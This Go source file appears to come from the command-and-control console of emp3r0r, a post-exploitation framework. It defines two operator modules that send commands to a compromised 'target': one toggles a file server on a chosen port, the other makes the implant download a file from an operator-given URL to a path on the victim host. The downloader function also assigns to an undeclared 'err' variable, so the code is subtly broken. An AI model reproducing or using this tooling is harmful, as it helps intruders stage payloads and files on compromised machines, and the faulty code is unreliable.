//go:build linux
// +build linux

package cc

import (
	"fmt"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
)

func moduleFileServer() {
	switchOpt, ok := Options["switch"]
	if !ok {
		CliPrintError("Option 'switch' not found")
		return
	}
	server_switch := switchOpt.Val

	portOpt, ok := Options["port"]
	if !ok {
		CliPrintError("Option 'port' not found")
		return
	}
	cmd := fmt.Sprintf("%s --port %s --switch %s", emp3r0r_data.C2CmdFileServer, portOpt.Val, server_switch)
	err := SendCmd(cmd, "", CurrentTarget)
	if err != nil {
		CliPrintError("SendCmd: %v", err)
		return
	}
	CliPrintInfo("File server (port %s) is now %s", portOpt.Val, server_switch)
}

func moduleDownloader() {
	requiredOptions := []string{"download_url", "checksum", "path"}
	for _, opt := range requiredOptions {
		if _, ok := Options[opt]; !ok {
			CliPrintError("Option '%s' not found", opt)
			return
		}
	}

	download_url := Options["download_url"].Val
	checksum := Options["checksum"].Val
	path := Options["path"].Val

	cmd := fmt.Sprintf("%s --download_url %s --checksum %s --path %s", emp3r0r_data.C2CmdFileDownloader, download_url, checksum, path)
	err = SendCmdToCurrentTarget(cmd, "")
	if err != nil {
		CliPrintError("SendCmd: %v", err)
		return
	}
}
